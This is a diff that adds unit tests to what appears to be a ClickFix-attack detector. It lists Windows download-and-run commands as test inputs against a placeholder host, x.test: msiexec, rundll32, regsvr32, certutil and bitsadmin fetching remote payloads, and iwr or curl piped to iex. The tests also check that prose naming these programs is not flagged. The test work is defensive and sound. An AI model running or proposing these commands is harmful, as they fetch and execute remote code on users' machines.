@@ -141,3 +141,76 @@ describe('the campaigns this product’s users actually meet', () => {
     ).toBeNull()
   })
 })
+
+describe('the Windows programs a ClickFix payload runs through (B-165)', () => {
+  /**
+   * The payload signal knew PowerShell, `mshta`, `certutil` and `bitsadmin`, and
+   * not the installers and loaders the 2025–2026 campaigns moved to: `msiexec`
+   * fetching a package from a URL, `rundll32` and `regsvr32` loading a library,
+   * `conhost --headless` hiding the window, `forfiles` and `wmic` starting a
+   * process. Each is matched as a command, with the switch or the argument that
+   * makes it one, so prose naming the program is not a payload.
+   */
+  const copiedOnly = (copied: string) =>
+    detectClickFix({ text: CAMPAIGN_TEXT, scriptedCopy: false, copied })
+
+  const commands: Array<[string, string]> = [
+    ['msiexec', 'msiexec /q /i https://x.test/update.msi'],
+    ['msiexec.exe', 'C:\\Windows\\System32\\msiexec.exe /package http://x.test/a.msi /quiet'],
+    ['rundll32', 'rundll32 \\\\x.test\\share\\a.dll,DllRegisterServer'],
+    ['rundll32 javascript', 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"'],
+    ['regsvr32', 'regsvr32 /s /n /u /i:http://x.test/a.sct scrobj.dll'],
+    ['conhost', 'conhost.exe --headless "C:\\Users\\Public\\update.exe"'],
+    ['forfiles', 'forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe'],
+    ['wmic', 'wmic process call create "calc.exe"'],
+    ['iwr piped to iex', 'iwr https://x.test/a | iex'],
+    ['curl piped to iex', 'curl.exe -s https://x.test/a | iex'],
+    ['mshta', 'mshta https://x.test/verify.hta'],
+    ['certutil', 'certutil -urlcache -f http://x.test/a.exe a.exe'],
+    ['bitsadmin', 'bitsadmin /transfer j http://x.test/a.exe %TEMP%\\a.exe'],
+  ]
+
+  for (const [name, payload] of commands) {
+    it(`reads a copied ${name} command as a command`, () => {
+      const verdict = copiedOnly(payload)
+      expect(verdict?.signals, payload).toContain('copied-text-is-a-command')
+      expect(verdict?.confidence, payload).toBe('high')
+    })
+  }
+
+  const prose = [
+    'Use msiexec to repair the installer if it fails.',
+    'rundll32 is a Windows program that loads libraries.',
+    'The regsvr32 tool registers controls.',
+    'conhost is the console host.',
+    'forfiles selects files in a folder.',
+    'wmic is deprecated in Windows 11.',
+  ]
+
+  for (const text of prose) {
+    it(`does not read prose naming the program as a command: "${text}"`, () => {
+      expect(copiedOnly(text)?.signals ?? [], text).not.toContain('copied-text-is-a-command')
+    })
+  }
+
+  it('leaves an innocent page that mentions msiexec in prose alone', () => {
+    // No pretext, nothing copied: an administrator's how-to is not an attack.
+    expect(
+      detectClickFix({
+        text: 'To repair the package, open a terminal and run msiexec /fa with the product code, then press Enter.',
+        scriptedCopy: false,
+        copied: null,
+      }),
+    ).toBeNull()
+  })
+
+  it('leaves a documentation page that copies an msiexec command alone, as it does curl', () => {
+    expect(
+      detectClickFix({
+        text: 'Silent install: copy the command below, paste it into the command prompt and press Enter.',
+        scriptedCopy: true,
+        copied: 'msiexec /i okolos.msi /qn',
+      }),
+    ).toBeNull()
+  })
+})
